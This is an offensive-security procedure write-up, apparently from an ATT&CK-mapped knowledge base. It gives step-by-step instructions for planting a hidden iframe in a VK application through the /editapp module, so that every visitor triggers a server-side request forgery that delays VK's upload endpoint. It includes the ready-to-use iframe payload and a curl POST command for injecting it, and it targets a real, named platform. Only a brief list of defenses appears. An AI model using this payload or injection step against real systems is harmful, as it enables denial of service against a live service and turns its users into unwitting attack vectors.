---
tags:
  - injection
  - iframe
  - ssrf
  - vk.com
  - php
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Drive-by Compromise]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: cdb84324-f926-4a77-b174-c50c31cc6ca7
created_at: '2025-12-14T04:39:18.689Z'
updated_at: '2025-12-14T04:39:18.689Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
---
# Inject-SSRF-Payload-into-VK-App-via-Edit-Module

## Summary

This procedure chains the SSRF DoS by injecting a malicious https-iframe containing the SSRF payload into a VK application using the /editapp module's validation flaw, automating the attack trigger when users visit the app.

## Description

The /editapp module lacks input sanitization, allowing attackers with app editing access to embed iframes with SSRF URLs. When users load the app, the iframe executes the request, propagating DoS without direct attacker involvement. This amplifies the SSRF impact in VK's ecosystem.

## Requirements

1. VK developer account for app creation/editing
2. Valid app ID and edit permissions
3. SSRF payload URL from prior exploitation step

## Defense

Defensive measures and detection strategies:

- Sanitize all app content inputs to block script/iframe injections
- Review app edits for malicious payloads using automated scanners
- Disable or restrict iframe usage in app modules

## Objectives

1. Embed SSRF-triggering iframe in a VK app
2. Automate DoS upon user app access
3. Amplify attack reach through social propagation

## Instructions

### Step 1: Prepare Malicious Iframe Payload

**Context**: Construct an iframe src with the SSRF endpoint and heavy URL.

Example payload:

```html
<iframe src="https://vk.com/upload.php?act=parse_share&url=http://httpbin.org/delay/20" style="display:none;"></iframe>
```

> This hidden iframe will trigger the SSRF on load.

### Step 2: Inject via Editapp Endpoint

**Context**: Use POST to the /editapp module to update app content with the iframe.

Use curl (assuming auth token from VK dev account):

```bash
curl -X POST "https://vk.com/editapp" -d "app_id=12345&content=<iframe src=\"https://vk.com/upload.php?act=parse_share&url=http://httpbin.org/delay/20\" style=\"display:none;\"></iframe>&access_token=YOUR_TOKEN"
```

> Replace placeholders; success if app updates without error.

### Step 3: Test Automated Trigger

**Context**: Access the modified app to verify iframe execution and DoS initiation.

Visit the app URL in a browser and monitor network requests:

> Observe the SSRF request firing automatically, leading to delays.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[injection]]
- [[iframe]]
- [[web]]
